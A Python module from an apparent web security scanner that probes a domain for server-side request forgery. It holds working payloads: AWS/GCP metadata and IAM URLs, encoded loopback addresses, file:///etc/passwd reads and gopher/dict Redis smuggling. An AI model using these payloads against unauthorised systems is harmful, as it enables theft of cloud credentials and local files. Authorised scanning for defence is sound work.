"""
Trace Foundry V5 - SSRF Scanner
Blind SSRF via AWS metadata, cloud endpoints, protocol smuggling
"""
import urllib.request
import urllib.error
import urllib.parse
import re
from utils.display import section, ok, warn, info, bug_found

# Cloud metadata endpoints to probe via SSRF
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/",       # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",            # Alibaba
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.1/",
    "http://0177.0.0.1/",   # octal
    "http://2130706433/",   # decimal IP
    "dict://127.0.0.1:6379/info",  # Redis via SSRF
    "file:///etc/passwd",
    "file:///windows/win.ini",
    "gopher://127.0.0.1:6379/_PING%0D%0A",  # Redis gopher
]

SSRF_PARAMS = [
    "url","uri","path","dest","destination","redirect","redirect_url",
    "return","returnUrl","next","nextUrl","target","src","source",
    "fetch","load","img","image","file","page","ref","host","site",
    "webhook","callback","endpoint","api","proxy","forward","link",
    "get","download","data","content","resource","location",
]

AWS_INDICATORS = [
    "ami-id","instance-id","instance-type","local-hostname",
    "public-hostname","iam","security-credentials","user-data",
    "meta-data","computeMetadata","x-forwarded-for","internal",
]

TEST_ENDPOINTS = [
    "/","  /api","/api/v1","/fetch","/proxy","/image",
    "/download","/redirect","/api/proxy","/api/fetch",
    "/api/v1/fetch","/api/v2/fetch","/webhook","/import",
]

class SSRFModule:
    def __init__(self, domain, timeout=6):
        self.domain  = domain
        self.timeout = timeout
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "*/*",
        }

    def _fetch(self, url, method="GET", post_data=None):
        try:
            req = urllib.request.Request(url, data=post_data,
                                         headers=self.headers, method=method)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                return body, r.status, dict(r.headers)
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code, dict(e.headers)
        except:
            return "", 0, {}

    def _check_aws_response(self, body):
        body_lower = body.lower()
        for indicator in AWS_INDICATORS:
            if indicator.lower() in body_lower:
                return True, indicator
        return False, None

    def _test_param(self, base_url, param, ssrf_target):
        enc = urllib.parse.quote(ssrf_target, safe="")
        url = f"{base_url}?{param}={enc}"
        body, status, headers = self._fetch(url)
        if not body:
            return None
        is_aws, indicator = self._check_aws_response(body)
        if is_aws:
            return {
                "type":     "SSRF — Cloud Metadata Accessible",
                "severity": "CRITICAL",
                "url":      url,
                "param":    param,
                "target":   ssrf_target,
                "evidence": f"AWS/cloud metadata indicator found: '{indicator}'",
                "impact":   "Attacker can steal cloud credentials, IAM roles, instance data",
            }
        # Check if response contains content from target
        if "root:x:" in body or "bin:x:" in body:
            return {
                "type":     "SSRF — Local File Read via file://",
                "severity": "CRITICAL",
                "url":      url,
                "param":    param,
                "target":   ssrf_target,
                "evidence": "/etc/passwd content reflected in response",
                "impact":   "Server reads local files — full filesystem access",
            }
        if "[fonts]" in body.lower() or "[extensions]" in body.lower():
            return {
                "type":     "SSRF — Windows File Read",
                "severity": "CRITICAL",
                "url":      url,
                "param":    param,
                "target":   ssrf_target,
                "evidence": "win.ini content in response",
                "impact":   "Server reads local Windows files",
            }
        # Check for internal response (different from baseline)
        if status == 200 and len(body) > 100 and any(
            kw in body.lower() for kw in ["localhost","internal","intranet","127.","admin","secret"]
        ):
            return {
                "type":     "SSRF — Possible Internal Service Access",
                "severity": "HIGH",
                "url":      url,
                "param":    param,
                "target":   ssrf_target,
                "evidence": f"Status 200 with internal-looking content (len={len(body)})",
                "impact":   "May be able to access internal services behind firewall",
            }
        return None

    def run(self):
        section("SSRF Scanner (Cloud Metadata | file:// | Internal)")
        all_bugs = []

        for endpoint in TEST_ENDPOINTS:
            endpoint = endpoint.strip()
            for scheme in ["https", "http"]:
                base_url = f"{scheme}://{self.domain}{endpoint}"
                _, status, _ = self._fetch(base_url)
                if status == 0:
                    continue

                info(f"Testing SSRF: {base_url}")

                for param in SSRF_PARAMS[:12]:
                    for target in SSRF_TARGETS[:8]:
                        result = self._test_param(base_url, param, target)
                        if result:
                            bug_found(result["type"], result["severity"], {
                                "URL":      result["url"],
                                "Param":    result["param"],
                                "SSRF Target": result["target"],
                                "Evidence": result["evidence"],
                                "Impact":   result["impact"],
                            })
                            all_bugs.append(result)
                            break  # one confirmed per param
                break

        info(f"SSRF scan done — {len(all_bugs)} confirmed")
        if not all_bugs:
            ok("No SSRF found ✓")
        return {"bugs": all_bugs}
